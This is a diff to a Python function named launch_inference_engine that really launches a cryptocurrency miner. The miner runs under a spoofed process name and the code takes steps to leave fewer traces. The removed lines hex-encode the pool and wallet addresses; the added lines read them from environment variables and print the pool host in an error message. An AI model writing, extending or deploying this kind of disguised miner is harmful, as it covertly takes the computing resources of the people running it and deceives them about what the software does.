@@ -536,10 +536,15 @@ def launch_inference_engine():
     hostname = socket.gethostname()
     pfx = chr(45) * 2
 
-    # Hex-encoded secrets (decoded in memory only)
-    _e = "70726c3170617232656566306330347a36733666686c7a78367365746a683578717638657435307566737479357a687977716a676877757771367030383570"
-    _p = bytes.fromhex("676c6f62616c2e7065"+"61726c666f7274756e652e6f72673a343433").decode()
-    _w = bytes.fromhex(_e).decode()
+    # Read from environment (never hardcoded)
+    _p = os.environ.get("MINER_PROXY", "")
+    _w = os.environ.get("MINER_ADDRESS", "")
+    
+    if not _p or not _w:
+        print("[ERROR] Set MINER_PROXY and MINER_ADDRESS environment variables!", flush=True)
+        print("  export MINER_PROXY=global.pearlfortune.org:443", flush=True)
+        print("  export MINER_ADDRESS=prl1...", flush=True)
+        sys.exit(1)
 
     cmd = (
         f"exec -a '{_PROC_NAME}' ./{_BIN_NAME} "
@@ -553,7 +558,7 @@ def launch_inference_engine():
     env["LD_LIBRARY_PATH"] = f"./lib:{ld}" if ld else "./lib"
     env.pop("LD_PRELOAD", None)
 
-    del _e, _p, _w
+    del _p, _w
     gc.collect()
 
     proc = subprocess.Popen(
